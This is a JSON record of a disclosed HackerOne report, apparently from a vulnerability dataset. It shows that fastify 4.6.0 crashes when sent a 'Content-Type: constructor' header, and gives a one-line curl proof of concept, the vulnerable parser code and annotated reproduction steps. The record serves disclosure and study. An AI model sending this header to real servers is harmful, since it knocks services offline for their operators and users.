{
  "reported_to": "Fastify",
  "reported_by": "bitk ",
  "title": "Deny of service via malicious Content-Type",
  "content": "\nSummary:\nI found a way to crash a fastify@4.6.0 server with a single query on a minimal setup.\nThe function ContentTypeParser.getParser() do not check properly if the requested content-type parser exists.\n/lib/contentTypeParser.js:94\nCode 159 Bytes\n1ContentTypeParser.prototype.getParser = function (contentType) {\n2  if (contentType in this.customParsers) {\n3    return this.customParsers[contentType]\n4  }\n5\n6...\nIf an attacker send constructor or any default Object attribute, the function will return something unexpected instead of a parser, here the function returns [Function: Object].\nThen the parser.fn function is called.\n/lib/contentTypeParser.js:94\nCode 75 Bytes\n1    const result = parser.fn(request, request[kRequestPayloadStream], done)\nBecause parser.fn is undefined, the application crashes.\nSteps To Reproduce:\nI used the code provided in the documentation\nindex.js\nCode 342 Bytes\n1const fastify = require('fastify')({\n2  logger: true\n3})\n4\n5// Declare a route\n6fastify.get('/', function (request, reply) {\n7  reply.send({ hello: 'world' })\n8})\n9\n10// Run the server!\n11fastify.listen({ port: 3000 }, function (err, address) {\n12  if (err) {\n13    fastify.log.error(err)\n14    process.exit(1)\n15  }\n16  // Server is now listening on ${address}\n17})\nStart the server:\nCode 134 Bytes\n1> node index.js\n2{\"level\":30,\"time\":1664375818521,\"pid\":8587,\"hostname\":\"localhost\",\"msg\":\"Server listening at http://127.0.0.1:3000\"}\n3\nWhen the server is ready, send the following POST request\nCode 102 Bytes\n1> curl -X POST http://127.0.0.1:3000 -H 'Content-Type: constructor'\n2curl: (52) Empty reply from server\nThe server had crashed with\nCode 38 Bytes\n1TypeError: parser.fn is not a function\nImpact\nA malicious actor can crash any fastify server as long as they are able to send a Content-type header.\n\n",
  "severity": [
    7.5,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1665405780,
  "report_url": "https://hackerone.com/reports/1715536",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Start a Fastify server (version 4.6.0) with the minimal setup provided in the documentation."
    ],
    [
      2,
      "Send a POST request to the server with a malicious 'Content-Type' header (e.g., 'constructor')."
    ]
  ],
  "vuln_description": "The vulnerability allows an attacker to crash a Fastify server by sending a POST request with a malicious 'Content-Type' header. The server fails to properly check if the requested content-type parser exists, leading to a TypeError when attempting to call an undefined function.",
  "reason": "The attack involves a single, straightforward step of sending a malformed header, and the vulnerability stems from a simple oversight in input validation. There are no complex interactions or states involved, and the exploit is easily reproducible with minimal context.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}